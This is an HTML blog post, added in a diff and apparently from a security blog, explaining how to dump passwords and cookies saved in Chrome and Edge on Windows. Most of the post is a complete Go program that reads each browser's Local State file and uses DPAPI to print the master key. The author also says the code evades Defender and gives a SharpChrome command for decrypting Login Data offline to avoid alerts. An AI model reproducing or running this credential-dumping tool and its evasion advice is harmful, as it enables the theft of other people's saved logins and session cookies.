@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="背景现在的浏览器(Chromium) 保存的密码 和 cookie 数据都是加密的，如果要获取其中的信息，需要了解他的加密机制，从而反向解密得到结果。而 windows 上所使用的加密方式是微软提供的 DPAPI ，关于这个加密机制不多介绍，关于浏览器如何使用 dpapi 加密的，大致流程如下，以浏览器存储的密码文件为例：  Chrome密码文件路径：%LocalAppData%\Google\C">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dump 浏览器数据">
+<meta property="og:url" content="http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/">
+<meta property="og:site_name" content="wude">
+<meta property="og:description" content="背景现在的浏览器(Chromium) 保存的密码 和 cookie 数据都是加密的，如果要获取其中的信息，需要了解他的加密机制，从而反向解密得到结果。而 windows 上所使用的加密方式是微软提供的 DPAPI ，关于这个加密机制不多介绍，关于浏览器如何使用 dpapi 加密的，大致流程如下，以浏览器存储的密码文件为例：  Chrome密码文件路径：%LocalAppData%\Google\C">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/image-20240707191230123.png">
+<meta property="article:published_time" content="2024-07-07T11:11:21.000Z">
+<meta property="article:modified_time" content="2024-07-07T11:12:53.811Z">
+<meta property="article:author" content="wude">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/image-20240707191230123.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>dump 浏览器数据</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/07/07/when-json-meets-json/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/07/07/apache-soap-rce-cve-2022-45378/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&text=dump 浏览器数据"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&title=dump 浏览器数据"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&is_video=false&description=dump 浏览器数据"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=dump 浏览器数据&body=Check out this article: http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&title=dump 浏览器数据"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&title=dump 浏览器数据"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&title=dump 浏览器数据"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&title=dump 浏览器数据"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&name=dump 浏览器数据&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&t=dump 浏览器数据"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86"><span class="toc-number">2.</span> <span class="toc-text">解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#btw"><span class="toc-number">3.</span> <span class="toc-text">btw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        dump 浏览器数据
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wude</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-07T11:11:21.000Z" class="dt-published" itemprop="datePublished">2024-07-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>现在的浏览器(Chromium) 保存的密码 和 cookie 数据都是加密的，如果要获取其中的信息，需要了解他的加密机制，从而反向解密得到结果。而 windows 上所使用的加密方式是微软提供的 DPAPI ，关于这个加密机制不多介绍，关于浏览器如何使用 dpapi 加密的，大致流程如下，以浏览器存储的密码文件为例：</p>
+<ul>
+<li>Chrome密码文件路径：<code>%LocalAppData%\Google\Chrome\User Data\Default\Login Data</code>；</li>
+<li>Chrome密钥文件路径：<code>%LocalAppData%\Google\Chrome\User Data\Local State</code>；</li>
+<li>Edge密码文件路径：<code>%LocalAppData%\Microsoft\Edge\User Data\Default\Login Data</code>；</li>
+<li>Edge密钥文件路径：<code>%LocalAppData%\Microsoft\Edge\User Data\Local State</code>；</li>
+</ul>
+<p>local state — dpapi –&gt; masterkey</p>
+<p>login data — masterkey –&gt; dec_data</p>
+<p>也就是说，只要通过 dpapi 得到 masterkey ，就可以去解密对应的 data。</p>
+<p>关于 dpapi 的使用，几乎每个语言都有封装好的 api 可以直接调用，也可以 github 搜索现成的。</p>
+<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>local state 是一个 json 文件，里面有一个 key ：encrypted_key ，这个 key 就是加密后的 masterkey，其中前 5 个字节是 dpapi 关键字：</p>
+<p><img src="/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/image-20240707191230123.png" alt="image-20240707191230123"></p>
+<p>所以，masterkey &#x3D; dpapi_dec(encrypted_key[5:])</p>
+<p>解密的代码如下：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">decKey</span><span class="params">(statePath <span class="type">string</span>)</span></span> <span class="type">string</span>&#123;</span><br><span class="line">	decodedBytes := getEncKey(statePath)</span><br><span class="line">	<span class="keyword">var</span> decStr <span class="type">string</span></span><br><span class="line">	<span class="keyword">if</span> decodedBytes != <span class="literal">nil</span>&#123;</span><br><span class="line">		decodedBytes = decodedBytes[<span class="number">5</span>:]</span><br><span class="line">		dec, err := Decrypt(decodedBytes)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatalf(<span class="string">&quot;Decrypt failed: %v&quot;</span>, err)</span><br><span class="line">		&#125;</span><br><span class="line">		decStr = fmt.Sprintf(<span class="string">&quot;%x&quot;</span>, dec)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> decStr</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Decrypt</span><span class="params">(data []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> outblob DATA_BLOB</span><br><span class="line">	r, _, err := procDecryptData.Call(<span class="type">uintptr</span>(unsafe.Pointer(NewBlob(data))), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, CRYPTPROTECT_UI_FORBIDDEN, <span class="type">uintptr</span>(unsafe.Pointer(&amp;outblob)))</span><br><span class="line">	<span class="keyword">if</span> r == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> procLocalFree.Call(<span class="type">uintptr</span>(unsafe.Pointer(outblob.pbData)))</span><br><span class="line">	<span class="keyword">return</span> outblob.ToByteArray(), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="btw"><a href="#btw" class="headerlink" title="btw"></a>btw</h2><p>因为 dpapi 的原因，获取 masterkey 这一步需要在本地做，利用用户的身份才可以解密，实测上面的 go 写的 dpapi 不会被 defender 拦截。获取到 masterkey 之后，解密 login data 的部分可以离线做，可以一定程度上避免产生告警，使用工具 SharpDPAPI 可以实现，只要将得到的 masterkey 和 login data 传给 SharpDPAPI 即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpChrome.exe logins /target:&quot;path/to/Login Data&quot; /statekey:your_masterkey</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面的代码只针对 密码，实际上存储的 cookie 也可以通过这个方法获取。</p>
+<p>完整代码如下，其中 dpapi 解密部分参考：<a target="_blank" rel="noopener" href="https://github.com/billgraziano/dpapi%EF%BC%8C%E5%85%B6%E4%BD%99%E9%83%A8%E5%88%86%E4%BD%BF%E7%94%A8">https://github.com/billgraziano/dpapi，其余部分使用</a> chatgpt</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;os/user&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">	<span class="string">&quot;regexp&quot;</span></span><br><span class="line">	<span class="string">&quot;syscall&quot;</span></span><br><span class="line">	<span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	CRYPTPROTECT_UI_FORBIDDEN = <span class="number">0x1</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	dllcrypt32  = syscall.NewLazyDLL(<span class="string">&quot;Crypt32.dll&quot;</span>)</span><br><span class="line">	dllkernel32 = syscall.NewLazyDLL(<span class="string">&quot;Kernel32.dll&quot;</span>)</span><br><span class="line"></span><br><span class="line">	procEncryptData = dllcrypt32.NewProc(<span class="string">&quot;CryptProtectData&quot;</span>)</span><br><span class="line">	procDecryptData = dllcrypt32.NewProc(<span class="string">&quot;CryptUnprotectData&quot;</span>)</span><br><span class="line">	procLocalFree   = dllkernel32.NewProc(<span class="string">&quot;LocalFree&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> DATA_BLOB <span class="keyword">struct</span> &#123;</span><br><span class="line">	cbData <span class="type">uint32</span></span><br><span class="line">	pbData *<span class="type">byte</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewBlob</span><span class="params">(d []<span class="type">byte</span>)</span></span> *DATA_BLOB &#123;</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(d) == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> &amp;DATA_BLOB&#123;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> &amp;DATA_BLOB&#123;</span><br><span class="line">		pbData: &amp;d[<span class="number">0</span>],</span><br><span class="line">		cbData: <span class="type">uint32</span>(<span class="built_in">len</span>(d)),</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(b *DATA_BLOB)</span></span> ToByteArray() []<span class="type">byte</span> &#123;</span><br><span class="line">	d := <span class="built_in">make</span>([]<span class="type">byte</span>, b.cbData)</span><br><span class="line">	<span class="built_in">copy</span>(d, (*[<span class="number">1</span> &lt;&lt; <span class="number">30</span>]<span class="type">byte</span>)(unsafe.Pointer(b.pbData))[:])</span><br><span class="line">	<span class="keyword">return</span> d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Decrypt</span><span class="params">(data []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> outblob DATA_BLOB</span><br><span class="line">	r, _, err := procDecryptData.Call(<span class="type">uintptr</span>(unsafe.Pointer(NewBlob(data))), <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, CRYPTPROTECT_UI_FORBIDDEN, <span class="type">uintptr</span>(unsafe.Pointer(&amp;outblob)))</span><br><span class="line">	<span class="keyword">if</span> r == <span class="number">0</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> procLocalFree.Call(<span class="type">uintptr</span>(unsafe.Pointer(outblob.pbData)))</span><br><span class="line">	<span class="keyword">return</span> outblob.ToByteArray(), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">readFileToBytes</span><span class="params">(filePath <span class="type">string</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    bytes, err := os.ReadFile(filePath)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> bytes, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getUser</span><span class="params">()</span></span> <span class="type">string</span>&#123;</span><br><span class="line">	currentUser, err := user.Current()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;无法获取当前用户信息：&quot;</span>, err)</span><br><span class="line">		os.Exit(<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	appDataDir := filepath.Join(currentUser.HomeDir, <span class="string">&quot;AppData&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> currentUser.Username == <span class="string">&quot;Administrator&quot;</span> &#123;</span><br><span class="line">		appDataDir = filepath.Join(appDataDir, <span class="string">&quot;Roaming&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		appDataDir = filepath.Join(appDataDir, <span class="string">&quot;Local&quot;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	_, err = os.Stat(appDataDir)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> os.IsNotExist(err) &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;AppData 目录不存在：&quot;</span>, err)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			fmt.Println(<span class="string">&quot;无法访问 AppData 目录：&quot;</span>, err)</span><br><span class="line">		&#125;</span><br><span class="line">		os.Exit(<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> appDataDir</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getEncKey</span><span class="params">(encKey <span class="type">string</span>)</span></span> []<span class="type">byte</span>&#123;</span><br><span class="line"></span><br><span class="line">	filePath := encKey </span><br><span class="line">	content, err := os.ReadFile(filePath)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;无法读取文件：&quot;</span>, err)</span><br><span class="line">		os.Exit(<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	pattern := <span class="string">&quot;\&quot;encrypted_key\&quot;:\&quot;(.*?)\&quot;&quot;</span></span><br><span class="line">	re := regexp.MustCompile(pattern)</span><br><span class="line">	matches := re.FindAllStringSubmatch(<span class="type">string</span>(content), <span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _, match := <span class="keyword">range</span> matches &#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(match) &gt; <span class="number">1</span> &#123;</span><br><span class="line">			decodedKey, err := base64.StdEncoding.DecodeString(match[<span class="number">1</span>])</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				fmt.Println(<span class="string">&quot;解码失败：&quot;</span>, err)</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> decodedKey</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">decKey</span><span class="params">(statePath <span class="type">string</span>)</span></span> <span class="type">string</span>&#123;</span><br><span class="line">	decodedBytes := getEncKey(statePath)</span><br><span class="line">	<span class="keyword">var</span> decStr <span class="type">string</span></span><br><span class="line">	<span class="keyword">if</span> decodedBytes != <span class="literal">nil</span>&#123;</span><br><span class="line">		decodedBytes = decodedBytes[<span class="number">5</span>:]</span><br><span class="line">		dec, err := Decrypt(decodedBytes)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatalf(<span class="string">&quot;Decrypt failed: %v&quot;</span>, err)</span><br><span class="line">		&#125;</span><br><span class="line">		decStr = fmt.Sprintf(<span class="string">&quot;%x&quot;</span>, dec)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> decStr</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	chrome := <span class="string">&quot;Google\\Chrome\\User Data\\Local State&quot;</span></span><br><span class="line">	edge := <span class="string">&quot;Microsoft\\Edge\\User Data\\Local State&quot;</span></span><br><span class="line">	appdata := getUser()</span><br><span class="line">	chromeState := filepath.Join(appdata, chrome)</span><br><span class="line">	edgeState := filepath.Join(appdata, edge)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;chrome StatePath: %s\n&quot;</span>, chromeState)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Edge StatePath: %s\n&quot;</span>, edgeState)</span><br><span class="line">	chromeKey := decKey(chromeState)</span><br><span class="line">	edgeKey := decKey(edgeState)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;chrome MasterKey: %s\n&quot;</span>, chromeKey)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;Edge MasterKey: %s\n&quot;</span>, edgeKey)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://github.com/billgraziano/dpapi">https://github.com/billgraziano/dpapi</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/3152/">https://paper.seebug.org/3152/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpDPAPI">https://github.com/GhostPack/SharpDPAPI</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E5%AF%86"><span class="toc-number">2.</span> <span class="toc-text">解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#btw"><span class="toc-number">3.</span> <span class="toc-text">btw</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
